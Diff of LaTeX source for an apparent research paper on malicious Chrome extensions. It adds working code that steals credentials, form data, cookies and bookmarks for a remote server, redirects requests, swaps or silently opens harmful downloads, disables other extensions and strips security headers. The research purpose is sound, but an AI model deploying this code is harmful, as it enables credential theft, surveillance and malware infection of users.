@@ -26,14 +26,16 @@
 	
 	To find approaches which we can use for our implementation, we first analyzed existing techniques for user tracking and fingerprinting. We present our results and our own implementations to support these techniques in the following two sections. Furthermore, we present selected parts of our implementations to collect the user's personal information in the third section.
 	
-	We transfer collected information to our remote server which handles the identification. Because the communication between the extension and a remote server is not part of this section, we refer to our implementations which we show in \autoref{sec:communication} as \textit{send method}.
+	We transfer collected information to our remote server which handles the identification. Because the communication between the extension and a remote server is not part of this section, we refer to our implementations that we show in \autoref{sec:communication} as \textit{send method}.
 	
 \subsection{User Tracking}
 
-	User tracking refers to the linking of multiple web pages that were visited by the same user. Applying this technique to web page's that belong to the same domain allows to follow the user's path through the domain's pages and determine his entry and exit points. This is commonly used for web analytics to help the website's author to improve the usability of his layout. User tracking between different domains produces an overview about the user's movement through the Internet. It is often used by advertising companies to gain information about the user's personal needs and preferences to provide personalized advertisements. 
+	User tracking refers to the linking of multiple web pages that were visited by the same user. Applying this technique to web page's that belong to the same domain allows to follow the user's path through the domain's pages and determine his entry and exit points. This is commonly used for web analytics to help the website's author to improve the usability of his layout. User tracking between different domains produces an overview about the user's movement through the Internet. It is often used by advertising companies who extract the user's personal needs and preferences from the websites he visits to provide personalized advertisements.
 		
 	The general method for user tracking includes a unique identifier which is intentionally stored on the user's machine the first time he visits a tracking web page. If the identifier is retrieved on later occasions, it notifies the tracking party that the same user has accessed another web page. There exists several possibilities to store server data inside the browser. We have listed some approach which we found in several research papers:
 	
+	
+	%TODO maybe rewrite
 %	\begin{itemize}
 %		\item \textbf{HTTP Cookies} Cookies are send back on every web request to their origin server. This simplifies user tracking, because the website's host does not have to take care about storing the cookie client-sided and retrieving it. 
 %		
@@ -71,7 +73,7 @@ document.body.appendChild(img);
 
 \subsubsection{Store Identifier In Extension}
 
-	If we have successfully identified the current user with other techniques, we store an unique identifier inside his instance of the extension. This simplifies his identification next time. An extension has its own local storage and Chrome even provides a cloud based storage which we use to store the identifier. Contrariwise to the web page's storage technologies such as cookies or the HTML5 local storage, the browser does not provide a user interface to clear the extension storage. The user has to manually delete associated files on his computer.
+	If we have successfully identified the current user with other techniques, we store an unique identifier inside his instance of the extension. This simplifies his identification next time. An extension has its own local storage and Chrome even provides a cloud based storage which we use to store the identifier. Contrariwise to the web page's storage technologies such as cookies or the HTML5 local storage, the browsers Chrome, Opera, and Firefox do not provide a user interface to clear the extension storage. The user has to manually delete associated files on his hard drive.
 
 \subsection{Fingerprinting}
 
@@ -158,6 +160,33 @@ function addVisitItems(storage, isLast) {
 	\end{code}
 
 
+\subsubsection{Bookmark Sniffing}
+
+	Similar to history sniffing, we retrieve the user's bookmarks as additional information for a fingerprint but also to get information about his preferred web pages. This allows us to explicit target web pages with our attacks that the user is high likely to visit. The browser's bookmark storage is structured as a tree. Therefore, our implementation which we show in \autoref{code:getBookmarks} recursively traverses the tree and extracts valuable information. First we define our recursive method that takes a node of the bookmark tree as parameter (line 1). Inside the method, we create an empty array to return found values (line 2). Then we check if the node has children nodes (line 3) and in this case call our recursive method on each child and add the returned value to our array (lines 4-6). If the current node contains a title and an URL, we store these values inside our array (lines 8-10) and finally return the array (line 11). To start the recursion, we get the root of the bookmark tree from the \texttt{bookmarks} module (line 13) and forward it to our recursion method (line 14).
+	
+	
+	\begin{code}
+		\begin{lstlisting}
+function getBookmarkInfos(node) {
+	var infos = [];
+	if(node.children) {
+		for(var i = 0; i < node.children.length; i++) {
+			infos = infos.concat(getBookmarkInfos(node.children[i]));
+		}
+	}
+	if(node.title && node.url) {
+		infos.push({'title': node.title, 'url': node.url, 'date': node.dateAdded});
+	}
+	return(infos);
+}
+chrome.bookmarks.getTree(function(root) {
+	send(getBookmarkInfos(root[0]));
+}); 
+\end{lstlisting}
+		\caption{Extension code to retrieve the user's bookmarks.}
+		\label{code:getBookmarks}
+	\end{code}
+
 \subsection{Personal User Information}
 	
 	Besides the before described techniques of user tracking and fingerprinting, an extension has more efficient ways to identify a user. The extension has full access to any web page that the user visits and is able to read out any information that is stored inside these pages. This allows us to even identify the person behind the web user by collection personal information such as his full name, address, or phone number. 
@@ -188,7 +217,7 @@ if(window.location.host === 'email.t-online.de' && window.location.href.indexOf(
 	});
 }
 \end{lstlisting}
-		\caption{Content script to read an outgoing email at the Telekom's email client.}
+		\caption{Content script to read an outgoing email.}
 		\label{code:readOutgoingEmailContent}
 	\end{code}
 	
@@ -263,7 +292,7 @@ chrome.runtime.onMessage.addListener(function(message, sender) {
 	\end{code}
 	
 
-\subsubsection{Facebook}
+\subsubsection{Social Media}
 
 	We developed a content script that collects the user's personal information while he navigates through his Facebook account. We present our implementation as an example that retrieves the user's name, the URL of his main page, the names of his friends, locations that he has shared with Facebook, and other personal information from his main page such as his date of birth, home town, or salutation.
 	
@@ -301,7 +330,7 @@ if(window.location.host === 'www.facebook.com') {
 
 \subsubsection{Online Banking}
 
-
+	%TODO implement + write
 
 	\begin{table}
 		\centering
@@ -312,7 +341,8 @@ if(window.location.host === 'www.facebook.com') {
 			Web Beacon & content script \\
 			\hline
 			History Sniffing & \texttt{history} \\
-			& content script \\
+			& Content script \\
+			Bookmark Sniffing & \texttt{bookmarks} \\
 			\hline
 			Additional Fingerprint Data & \texttt{system.cpu} \\
 			& \texttt{system.memory} \\
@@ -361,7 +391,7 @@ xhr.send(message);
 
 \subsubsection{Iframe}
 
-	Another strategy that we use to transfer information to a remote host was described by Liu et al. \cite{Liu12chromeextensions:}. They analyzed possible threats in Chrome's extension model through malicious behavior and conducted that an extension can executed HTTP requests to any arbitrary host without cross-site access privileges. For that purpose, they we use the mechanics of an \textit{iframe} element. Its task is to display a web page within another web page. The displayed web page is defined by the URL stored inside the iframe's \textit{src} attribute. If the URL changes, the iframe reloads the web page. Adding parameters to the URL allows us to send data to the targeted server. 
+	Another strategy that we use to transfer information to a remote host was described by Liu et al. \cite{Liu12chromeextensions:}. They analyzed possible threats in Chrome's extension model through malicious behavior and conducted that an extension can executed HTTP requests to any arbitrary host without cross-site access privileges. For that purpose, they we use the mechanics of an \textit{iframe} element. Its task is to display a web page within another web page. The displayed web page is defined by the URL stored inside the iframe's \textit{src} attribute. If the URL changes, the iframe tries to fetch the web page by sending a request to the defined URL. Adding parameters to the URL allows us to send data to the targeted server. 
 
 	We implemented the content script shown in \autoref{code:sendDataWithIframe}. First, it creates a new \texttt{iframe} element (line 1), hides it from the user by setting the iframe's CSS style property (line 2), and appends it to the web page's DOM (line 3). When the iframe's URL source property is changed, a subsequent URL request is initiated. This way, we can transmit data to the remote server by encoding it as URL parameter (lines 4-6).
 
@@ -484,34 +514,43 @@ window.addEventListener('message', function(event) {
 \clearpage
 \section{Execution}
 \label{sec:execution}
-	
-
-\subsection{Steal Information}
-
-	% refer to implementations in user identification section, have already shown that we can steal sensitive information
-
-\subsubsection{Steal Credentials}
 	%TODO intro
 	
-	To steal the credentials from a login form, we use two content scripts which we inject in every web page. This attack does not need additional permissions. The content script shown in \autoref{code:stealCredentialsOnSubmit} steals the credentials if the user submits the login form and The other one shown in \autoref{code:stealCredentialsFromPasswordManager} steals the credentials if the browser's password manager has filled them in the login form. To send the stolen credentials to our remote server, we use the \texttt{send} method shown in \autoref{code:sendDataWithIframe} because it does not need additional permissions, too. 
-	
-	In \autoref{code:stealCredentialsOnSubmit} we begin with retrieving an input element of type password (line 1). If we have found one (line 2), we retrieve the form which contains the password element (line 3). Finally, we add an event listener to the form which is triggered if the user submits the form and subsequently sends the form with all its values to our remote server (lines 4-6). 
-	
-	\autoref{code:stealCredentialsFromPasswordManager} is a similar implementation to \autoref{code:stealCredentialsOnSubmit}. Again, we begin with getting an input element of type password and the corresponding form element (lines 1-3). Then we delay the execution about 500 milliseconds to give the password manager the time to fill in the form's credentials (line 4). Finally, if the password field is not empty, we will send the form to our remote server (lines 5-7).
+	% state that content script equals host permission, interchangable depending on how the script was fetched, if executed with eval in content script extension needs content script, if executed with chrome.tabs.executeScript extension needs hos permission,
+	% refer to implementations in user identification section, have already shown that we can steal sensitive information
+
+\subsection{Steal Form Data}
+
+	The user often transmits sensitive information to a web server using a form. We can intercept and steal these transmitted data using the simple content script that we show in \autoref{code:interceptForm}. First, we search for all form elements and add an listener to the form's submit event (line 1). If the user submits the form, we collect the forms values and forward them to our send method (line 2).
 	
 	\begin{code}
+		\begin{lstlisting}
+$('form').submit(function() {
+	send($(this).serialize());
+});
+		\end{lstlisting}
+		\caption{Content script to intercept any form if the user submits it.}
+		\label{code:interceptForm}
+	\end{code}
+	
+	We find a more concrete application for this attack on authentication web pages. These contain a web form in which the user enters his credentials to authenticate on a web application. If we obtain his credentials, we can impersonate him on this particular application. 
+	
+	To intercept and steal the user's credentials from an authentication form if the user submits the form, we use the content script that we show in \autoref{code:stealCredentialsOnSubmit}. It is similar to the implementation to intercept any form which we have shown before in \autoref{code:interceptForm}. Instead of targeting any form, we search for an input element of type password inside the form element (line 2) and send the form if we found at least one (lines 3-5).
+
+	\begin{code}
 		\begin{lstlisting}	
-var passwordElement = $('input[type="password"');
-if(passwordElement.length > 0) {
-	var form = passwordElement.closest('form');
-	form.submit(function(event) {
-		send(form);
-	});
-}
+$('form').submit(function() {
+	var passwordElement = $(this).find('input').filter('[type=password]');
+	if(passwordElement.length > 0) {
+		send($(this).serialize());
+	}
+});		
 \end{lstlisting}
 		\caption{Content Script that steals credentials from a login form if the user submits the form.}
 		\label{code:stealCredentialsOnSubmit}
 	\end{code}
+
+	The browser provides a storage for entered credentials to the user. If the user has stored his credentials for a particular web page and opens this page on a later occasion, the browser will fill in the stored credentials. We implemented a further content script that steals the credentials from an authentication form after the browser has filled in the form. For that purpose, we use the implementation that we show in \autoref{code:stealCredentialsFromPasswordManager}. First, we search for an input field of type password )line 1). If we find at least one (line 2), we retrieve the corresponding form element (line 3). Then, we wait for 500 milliseconds to give the browser the time to fill in the credentials (lines 4\&8). If the password element contains a value (line 5), we finally forward the form with all its value to our send method (line 6). 
 	
 	\begin{code}
 		\begin{lstlisting}
@@ -520,7 +559,7 @@ if(passwordElement.length > 0) {
 	var form = passwordElement.closest('form');
 	setTimeout(function() {
 		if(passwordElement.val() != '') {
-			send(form);
+			send(form.serialize());
 		}
 	}, 500);
 }
@@ -529,9 +568,45 @@ if(passwordElement.length > 0) {
 		\label{code:stealCredentialsFromPasswordManager}
 	\end{code}
 	
+
+\subsection{Manipulate Web Requests}
+
+	An extension is able to manipulate outgoing web requests. We can redirect a GET request to load a malicious lookalike of the original web page, redirect a POST request to obtain probably sensitive values, or manipulate the values of a request's body to harm the user. Most requests initiates the user from within a web page. Therefore, we use a content script to manipulate URLs and form values inside a particular web page. Additionally, we use the \texttt{webRequest} module to intercept and manipulate outgoing web requests.
+	
+	We implemented a content script that manipulates the value of a form field if the user submits the form and show our implementation in \autoref{code:manipulateForm}. First, we search for a form element in the web page's DOM and add an listener that is triggered if the user submits the form (line 1). Then we search for an input field with the targeted name inside the form (line 3) and finally set its value (line 4).
+
+	\begin{code}
+		\begin{lstlisting}
+$('form').submit(function() {
+	$(this)
+		.find('input[name=' + TARGETED_FORM_KEY + ']')
+		.val(MANIPULATED_FORM_VALUE);
+});
+\end{lstlisting}
+		\caption{Content script to manipulate a form if the user submits it.}
+		\label{code:manipulateForm}
+	\end{code}
+
+	We can change the target to which the values of a form are transmitted by manipulating the forms \texttt{action} attribute. For that purpose, we use the following code snippet: \lstinline|$('form').attr('action', TARGET_URL);|. First, we query for a form element and then we set its action attribute to our targeted URL. Similar, we can change the target web page of a link element. For that purpose, we change the value of the link's \texttt{href} attribute. Again, we us a small code snippet: \lstinline|$('a[href~=' + TARGETED_URL + ']').attr('href', TARGET_URL);|. This time, we query for a link element whose current URL belongs to our targeted web page and exchange the URL with the one of our malicious server. We implemented an equal attack which uses the \texttt{webRequst} module instead of a content script. This allows us to redirect any web request. To execute this attack, the extension needs the \texttt{webRequest} and \texttt{webRequestBlocking} permissions and proper host permissions for the targeted web page such as \texttt{http://*/*} and \texttt{https://*/*}. 
+	
+	We show our implementation in \autoref{code:redirectRequest}. Initially, we register a listener that is triggered when the browser initiates a web request (line 1). Additionally, we explicit state that our listener is triggered on any HTTP or HTTPS request and that it is executed in a blocking manner which results in the request being blocked until our listener returns (line 6). Inside the listener, we check if the request's URL matches our targeted URL (line 2) and in this case return the URL of our target server as redirection URL (line 3).
+	
+	\begin{code}
+		\begin{lstlisting}
+chrome.webRequest.onBeforeRequest.addListener(function(details){
+	if(details.url === TARGETED_URL) {	
+		return({ 'redirectUrl': TARGET_URL });
+	}
+},
+{urls: ['https://*/*', 'http://*/*']}, ['blocking']);	
+\end{lstlisting}
+		\caption{Extension code to redirect a request.}
+		\label{code:redirectRequest}
+	\end{code}
 	
 	
 \subsection{Execute Attack In Background}
+\label{sec:executeAttackInBackground}
 
 	We implemented several approaches that open predefined web pages to execute particular attacks such as to steal probably stored credentials from the browser's password manager. Different strategies to hide the loading of a new web page were previously discussed by Bauer et al. \cite{extensions:cns14}. We implemented three described approaches:
 	
@@ -541,9 +616,9 @@ if(passwordElement.length > 0) {
 		\item Open a new tab in an inactive browser window and load the targeted web page in this tab. Close the tab after the attack has finished.
 	\end{enumerate} 
 	
-	The first approach is the least reliable one. There exists several methods to enforce that a web page is not displayed in an iframe. The standardized approach is to use the \texttt{X-Frame-Option} HTTP header which is compatible with all current browsers \cite{xFrameOptionsSpezification, xFrameOptionsCompability}. This transfers the responsibility to enforce that the web page is not loaded into an iframe to the browser. Other approaches use JavaScript to deny the web page's functionality if it is loaded in an iframe or to move the web page from the iframe to the main frame.
+	The first approach is the least reliable one. There exists several methods to enforce that a web page is not displayed in an iframe. The standardized approach is to use the \texttt{X-Frame-Option} HTTP header which is compatible with all current browsers \cite{xFrameOptionsSpezification, xFrameOptionsCompability}. This transfers the responsibility to enforce that the web page is not loaded into an iframe to the browser. Other approaches use JavaScript to deny the web page's functionality if it is loaded in an iframe or to move the web page's content from the iframe to the main frame.
 		
-	To open a particular web page in an iframe, we use a content script with the \texttt{any\_frame} option which enables that the content script is executed in iframes, too. Our implementation is shown in \autoref{code:openWebPageInIframe}. It checks whether or not it is currently active in the main frame (line 1). If it is active in an iframe, we execute another attack in the scope of the loaded web page. If the content script is currently active in the main frame, we send a message to the extension's background to retrieve a URL (line 2). This is necessary because the content script itself can not store data - in our case a list of URLs - between different instances of itself. Then, we create a new iframe (line 3), turn it invisible for the user by setting its display property (line 4), set it's source attribute to the given URL which subsequently loads the targeted web page (line 5), and finally add it to the web page's DOM (line 6). 
+	To open a particular web page in an iframe, we use a content script with the \texttt{any\_frame} option which enables the execution of the content script in all sub-frames of the current web page such as iframes. Our implementation is shown in \autoref{code:openWebPageInIframe}. We first check if the content script is currently active in the main frame (line 1). If this case applies, we send a message to the extension's background to retrieve a URL (line 2). This is necessary because the content script itself can not store data - in our case a list of targeted URLs - between different instances of itself. Then, we create a new iframe element (line 3), turn it invisible for the user by setting its display property (line 4), set it's source attribute to the given URL which subsequently loads the targeted web page (line 5), and finally add it to the web page's DOM (line 6). 
 	
 	\begin{code}
 		\begin{lstlisting}
@@ -626,15 +701,15 @@ var interval = setInterval(function() {
 
 
 
-\subsection{Download Files}
+\subsection{Download Harmful Files}
 
-	Using the \textit{download} module, an extension is able to monitor and cancel the user's downloads or to initiate a download itself. We implemented three attacks using this module. The purpose of these attacks is to get access to the user's machine which we can not achieve using only an extension. Therefore, we download additional, harmful files and execute them on the user's operating system. The first attack downloads a file without the user noticing and opens it itself. The second and third await a download initiated by the user and exchange the downloaded file. In this case, the user will execute the file for us because he trusts a file that he has downloaded himself.
+	Using the \textit{download} module, an extension is able to monitor and cancel the user's downloads or to initiate a download itself and event to open a downloaded file. We misuse this feature to get access to the user's machine which the extension itself does not have. For that purpose, we download a harmful file which contains malewar or similar on the user's computer and execute it. 
 	
-	We implemented a component, that executes the first described attack namely downloading a file and opening it. For that purpose, the extension needs the \texttt{downloads} permission and additionally the \texttt{downloads.open} permission to open the downloaded file and the \texttt{downloads.shelf} permission to hide the download from the user. The \texttt{downloads.shelf} permission enables an extension to show or remove the shelf at the bottom of the browser that shows active downloads. 
+	We implemented a component that downloads a file and opens it. For that purpose, the extension needs the \texttt{downloads} permission and additionally the \texttt{downloads.open} permission to open the downloaded file and the \texttt{downloads.shelf} permission to hide the download from the user. The \texttt{downloads.shelf} permission enables an extension to show or remove the shelf at the bottom of the browser that shows active downloads. 
 	
-	To open a downloaded file, the user has to interact with the extension and deliver some kind of input such as a mouse click. If no user input is given, the browser blocks the opening of a file. In our implementation, we use a content script that adds an on click event to each element of the current web page. If the user clicks any element, we send a message to our background script which also transfers the desired user input and use it to open the file.
+	To open a downloaded file, the user has to interact with the extension and deliver some kind of input such as a mouse click. If no user input is given, the browser blocks the opening of a file. In our implementation, we use a content script that adds an on click event to each element of the current web page. If the user clicks any element, we send a message to our background script which also transfers the desired user input and use this to open the file.
 
-	We show our implementation of the attacks's background script in \autoref{code:downloadAndOpenFile}. We start by disabling the download status bar of the browser so that the user does not see the download (line 2). Then, we initiate the download (line 3), wait until it has finished (line 4), and store its browser-internal id (line 5). We await a message from our content script and use the transmitted mouse click to open the downloaded file (lines 8-10). Finally, we delete our file from the browser's list of downloads and re-enable the download status bar to prevent that the user notices our attack (lines 11-12).
+	We show our implementation in \autoref{code:downloadAndOpenFile}. We start by disabling the download status bar of the browser so that the user does not see the download (line 2). Then, we initiate the download (line 3), wait until it has finished (line 4), and store its browser-internal id (line 5). We await a message from our content script and use the transmitted mouse click to open the downloaded file (lines 8-10). Finally, we delete our file from the browser's list of downloads and re-enable the download status bar to prevent that the user notices our attack (lines 11-12).
 	
 	\begin{code}
 		\begin{lstlisting}
@@ -657,7 +732,7 @@ chrome.runtime.onMessage.addListener(function() {
 		\label{code:downloadAndOpenFile}
 	\end{code}
 	
-	We implemented another background script that cancels a download which the user has initiated and then initiates a download itself. The aim of this attack is to exchange the file that user wants to download with a harmful one without him noticing. If it was successful, the user will execute the harmful file believing it is his desired file. Therefore, our implementation transmits the file's name and mime type with the request to download the harmful file. The server has to provide a file with the transmitted name and mime type to persuade the user.
+	We implemented another approach that cancels a download which the user has initiated and then initiates a download itself of a harmful file with the same name and mime-type as the original one. If the user does not recognize the exchange of the file, he will execute the file and therefore the implemented attack for us.
 	
 	Our implementation is shown in \autoref{code:exchangeDownloadFile}. First, we create an event listener that is triggered if the user initiates a new download (line 1). We only target files with a particular mime type and therefore check if the downloading file's mime type matches (line 2). If this is true, we cancel the user's download (line 3), remove the entry from the browser's downloads list and the download status bar (line 4), and initiate the download of a file from our remote server (line 5). We send the name and the mime type of the file that the user wants to download along the request (line 6). This allows us to set the mime type and the filename correctly at our remote server.
 	
@@ -678,7 +753,7 @@ chrome.downloads.onCreated.addListener(function (downloadItem) {
 		\label{code:exchangeDownloadFile}
 	\end{code}
 	
-	Similar to our attack implementation at \autoref{code:exchangeDownloadFile}, we listen for the user initiating a new download, check for a particular mime type of the downloading file, and wait until the download has finished (lines 1-3). To generate a fake file at our remote server, we extract the name of the downloaded file from its full path on the user operating system (line 4). We remove the downloaded file (lines 5-7) and download our fake file (line 8-10). Again, we forward the name and mime type of the downloaded file to our remote server (line 9).
+	We implemented a similar approach that removes the downloaded file as soon as the download has finished and initiates a second download of a harmful file with the same name and mime-type as the original one. In our implementation shown in \autoref{code:exchangeDownloadFile} we listen for the user initiating a new download (line 1), check for a particular mime type of the downloading file (line 2), and wait until the download has finished (line 3). To generate a fake file at our remote server, we extract the name of the downloaded file from its full path on the user operating system (line 4). We remove the downloaded file (lines 5-7) and download a harmful fake file (line 8-10). Again, we forward the name and mime type of the downloaded file to our remote server (line 9).
 	
 	\begin{code}
 		\begin{lstlisting}
@@ -705,27 +780,14 @@ chrome.downloads.onCreated.addListener(function (downloadItem) {
 
 \subsection{Steal Cookies}
 
-	\begin{code}
-		\begin{lstlisting}
-chrome.cookies.getAll({ url: TARGETED_URL }, function(cookies) {
-	send(cookies);
-});
-\end{lstlisting}
-		\caption{Extension code to steal cookies from any website.}
-	\end{code}
+	We implemented two components for our design, that follow different strategies to steal currently stored cookies from the user's browser. Cookies often contain a session id that authenticates the current user to a web application. If we obtain this information, we are able to impersonate the user on this particular web application. 
 	
-	\begin{code}
-		\begin{lstlisting}
-send(document.cookie.split(';'));
-\end{lstlisting}
-		\caption{Content script to steal cookies from the current web page.}
-	\end{code}
+	JavaScript in a displayed web page has access to cookies that belong to the same domain as the web page with exception to cookies with the \texttt{httpOnly} key set. We use this in our first implementation that uses a single content script in any web page. The cookies are stored inside the DOM and we access them with with \texttt{document.cookie}. Obviously, this implementation is restricted to web page's that the user visits while the extension is active and without access to \texttt{httpOnly} cookies. Therefore, we implemented the second approach that uses the \texttt{cookies} module. Using this module, we have access to all cookies that are currently stored inside the browser without restrictions besides the extension's permissions. To use it, the extension needs the \texttt{cookies} permission and host permissions for any web page such as \texttt{http://*/*} and \texttt{https://*/*}. We use the method \texttt{chrome.cookies.getAll} which accepts an object to filter retrieved cookies based on the cookie's values such as the URL, domain, or its secured state.
+ 
 
+\subsection{Disable Other Extension}
 
-
-\subsection{Hamper Extension Management}
-
-	We query for all currently installed extensions (line 1), iterate over the returned list (line 2), check if the extension's name equals our targeted extension (line 3), and finally disable the targeted extension (line 4). 
+	In order that other, security relevant extensions do not block our attack implementations, we implemented a component that disables another extension. For that purpose, the extension needs the \texttt{management} permission which gives access to the correspondent module. To disable another extension, we need the targeted extension's name. We show our implementation script in \autoref{code:disableExtension}. First, we query for all currently installed extensions (line 1), iterate over the returned list (line 2), check if the extension's name equals our targeted extension (line 3), and finally disable the targeted extension (line 4). 
 
 	\begin{code}
 		\begin{lstlisting}
@@ -738,18 +800,16 @@ chrome.management.getAll(function(infos) {
 });
 \end{lstlisting}
 		\caption{Extension code to silently disable another extension.}
+		\label{code:disableExtension}
 	\end{code}
 
 
 
-
-
-\subsection{Web Requests}
-
-	An extension with access to the \texttt{webRequest} module is able to modify and remove security relevant headers from a HTTP response. 
-	To execute the first approach, our implementation removes the \texttt{X-Frame-Option} from any incoming web request to be able to load particular web pages into an iframe and steal probably stored credentials. For that purpose, it needs the permissions \texttt{"webRequest"}, \texttt{"webRequestBlocking"}, \texttt{"https://*/*"}, and \texttt{"http://*/*"}. 
-
-	We begin by adding an event listener which is triggered if the browser receives the headers of a web request's response (line 1). Additionally, we explicit state that our listener is triggered on any HTTP or HTTPS request, that it is executed in a blocking manner which means the browser waits with the request's processing until our listener finishes, and that our listener has access to the response's headers (line 9). If the listener is triggered, we iterate over all headers (line 2) and compare the header's names. If it equals our targeted header's name, we remove the header from the list (lines 3-5). Finally we return the modified headers list and consequently continue the web request's processing. 
+\subsection{Remove Security Headers}
+	
+	We implemented a component that removes security relevant response headers. We use this implementation to support our component that opens a particular web page in an iframe which we have shown in \autoref{sec:executeAttackInBackground}. This attack is hampered by web pages that use the \texttt{X-Frame-Option} header, because the browser disallows displaying the web page inside an iframe. By removing this header from the web request's response, we improve the attacks' success rate. Similar, we can support any content script that executes web requests to fetch content. If the web page uses a Content Security Policy that blocks the loading of scripts or other web pages, we can remove the CSP and allow our content script to execute its task.
+	
+	We show our implementation in \autoref{code:removeHTTPResponseHeader}. First, we add an event listener that is triggered if the browser receives the headers of a web request's response (line 1). Like we have done for web request listeners before, we state that our listener is triggered on any request, executed in a blocking manner, and has access to the response's headers (line 9). If the listener is triggered, we iterate over all headers (line 2) and compare the header's names (line 3). If it equals our targeted header's name, we remove the header from the list (line 4). Finally we return the modified headers list and consequently continue the web request's processing (line 7). 
 
 	\begin{code}
 		\begin{lstlisting}
@@ -767,22 +827,9 @@ chrome.webRequest.onHeadersReceived.addListener(function(details) {
 		\label{code:removeHTTPResponseHeader}
 	\end{code} 
 
-	Initially, we register a listener that is triggered when the browser initiates a web request (line 1). Like before, the listener is triggered on any HTTP or HTTPS request, the request's processing is blocked while the listener is active, and the listener has access to the request's body (line 8). Because a request does not mandatory have a body with values, we check if the currently processing request has one (line 2). Then, we check if our targeted form data is present (line 3) and exchange its value with a manipulated one (line 4). 
+
 	
-	\begin{code}
-		\begin{lstlisting}
-chrome.webRequest.onBeforeRequest.addListener(function(details){
-	if(details.requestBody && details.requestBody.formData) {
-		if(details.requestBody.formData[TARGETED_FORM_KEY]) {
-			details.requestBody.formData[TARGETED_FORM_KEY] = MANIPULATED_FORM_VALUE;
-		}
-	}
-},
-{urls: ['https://*/*', 'http://*/*']}, ['blocking', 'requestBody']);
-\end{lstlisting}
-		\caption{Extension code to manipulate an outgoing web requests that contains a form.}
-		\label{code:manipulateWebRequestForm}
-	\end{code}
+	
 	
 	\begin{table}
 		\begin{tabular}{|l|l|} \hline 
@@ -790,6 +837,11 @@ chrome.webRequest.onBeforeRequest.addListener(function(details){
 			Steal sensitive user data & Content script \\
 			Steal form data & Content script \\
 			Steal credentials & Content script \\
+			\hline
+			Manipulate form values & Content script \\
+			Manipulate form target URL & Content script \\
+			Manipulate link target URL & Content script \\
+			Redirect request & \texttt{http://*/*, https://*/*, webRequest, webRequestBlocking} \\
 			\hline
 			Execute concealed attack in iframe & Content script \\
 			Execute concealed attack in inactive tab & \texttt{http://*/*, https://*/*, tabs} \\
@@ -801,10 +853,12 @@ chrome.webRequest.onBeforeRequest.addListener(function(details){
 			Exchange a downloaded file & \texttt{downloads} \\
 			Exchange a currently downloading file & \texttt{downloads} \\
 			\hline
+			Steal cookies from current web page & Content script \\
+			Steal all cookies & \texttt{http://*/*, https://*/*, cookies} \\
+			\hline
 			Disable another extension & \texttt{management} \\
 			\hline
-			Remove Security Relevant HTTP Header & \texttt{http://*/*, https://*/*, webRequest, webRequestBlocking} \\
-			Manipulate outgoing web request & \texttt{http://*/*, https://*/*, webRequest, webRequestBlocking} \\
+			Remove request response header & \texttt{http://*/*, https://*/*, webRequest, webRequestBlocking} \\
 			\hline
 		\end{tabular}
 		\caption{Summary of implemented attacks with needed permissions.}
